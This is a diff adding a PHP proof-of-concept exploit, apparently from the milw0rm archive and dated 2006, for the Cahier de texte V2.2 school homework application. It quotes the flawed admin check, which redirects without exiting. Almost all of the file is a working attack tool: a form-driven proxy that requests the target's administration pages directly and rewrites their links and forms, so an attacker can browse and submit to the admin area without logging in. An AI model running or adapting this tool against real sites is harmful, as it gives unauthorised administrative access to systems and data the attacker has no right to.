@@ -1,0 +1,115 @@
+<?
+/*
+
+  Informations
+  ============
+  Affected.scr..: Cahier de texte V2.2 (last version)
+  Poc.ID........: 17061224
+  Type..........: Bypass general access restriction
+  Risk.level....: High
+  Conditions....: None
+  Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/
+  Poc.link......: acid-root.new.fr/poc/17061224.txt
+  Credits.......: DarkFig
+
+  Vulnerable code
+  ===============
+  <?php session_start();
+  if (isset($_SESSION['nom_prof'])) { 
+  if ($_SESSION['nom_prof']<>'Administrateur') { header("Location: ../index.php");}
+  ;} else { header("Location: ../index.php");}?>
+  ...
+
+*/
+
+if(!isset($_GET['host']) || empty($_GET['host'])) headers();
+if(!isset($_GET['wanted'])) $wanted = 'index.php';
+
+$host = $_GET['host'];
+$prox = $_GET['prox'];
+$path = $_GET['path'];
+echo sockxp($host,$path,$prox,"administration/".$wanted);
+exit(0);
+
+function headers()
+{
+	print("<html>
+<head>
+ <title>Cahier de texte V2.2 Exploit</title>
+</head>
+<body>
+ <form method='get' action='".$_SERVER['PHP_SELF']."'>
+  <input type='text' name='host' value='host'>
+  <input type='text' name='path' value='path'>
+  <input type='text' name='prox' value='proxyhost:proxyport'>
+  <input type='submit' value='Exploit'>
+ </form>
+</body>
+</html>");
+	exit(0);
+}
+
+function sockxp($host,$path,$prox,$wanted)
+{
+	$hope = !empty($prox) ? $prox : $host.':80';
+	preg_match("/^(\S*):([0-9]+){1,5}/",$hope,$hosta);
+	$hosh = $hosta[1];
+	$hosp = $hosta[2];
+	
+	$recv = '';
+	$meth = $_SERVER['REQUEST_METHOD'];
+	if(empty($hosh) || empty($hosp)) exit(1);
+
+	if(!$sock = fsockopen($hosh,$hosp)) exit(1);
+	$dat  = $meth." http://".$host;
+	
+	if($meth === "POST") $dat .= "/".str_replace("administration//","",$wanted);
+	else $dat .= $path.$wanted;
+	
+	$dat .= " HTTP/1.1\r\n";
+	$dat .= "Host: $host\r\n";
+	$dat .= "Connection: Close\r\n";
+	
+	if($meth === "POST") {
+		$postdata = get_postdata();
+		$dat .= "Content-Type: application/x-www-form-urlencoded\r\n";
+		$dat .= "Content-Length: ".strlen($postdata)."\r\n\r\n";
+		$dat .= $postdata."\r\n\r\n";
+	} else {
+		$dat .= "\r\n";
+	}
+
+	fputs($sock,$dat);
+	while(!feof($sock)) $recv .= fgets($sock);
+	fclose($sock);
+
+	return html_replace($recv);
+}
+
+function html_replace($htmlc)
+{
+	global $host,$path,$prox;
+	$iniv = $_SERVER['PHP_SELF']."?host=$host&path=$path&prox=$prox&wanted=";
+	$newc = str_replace("action=\"","action=\"$iniv",$htmlc);
+	$newc = str_replace("=\"..","=\"http://${host}${path}administration/..",$newc);
+	$newc = str_replace("a href=\"","a href=\"$iniv",$newc);
+	$newc = str_replace("MM_goToURL('parent','","MM_goToURL('parent','$iniv",$newc);
+	$newc = explode("\n",$newc);
+	for($i=1;$i<count($newc);$i++) {
+		if(!preg_match("/(\S*):/",$newc[$i])) $v=1;
+		if($v) $nnewc .= $newc[$i]."\n";
+	}
+	return $nnewc;
+}
+
+function get_postdata()
+{
+	$postdata = '';
+	foreach($_POST as $key => $value) {
+		$postdata .= $key."=".$value."&";
+	}
+	return $postdata;
+}
+?>
+
+# milw0rm.com [2006-12-26]
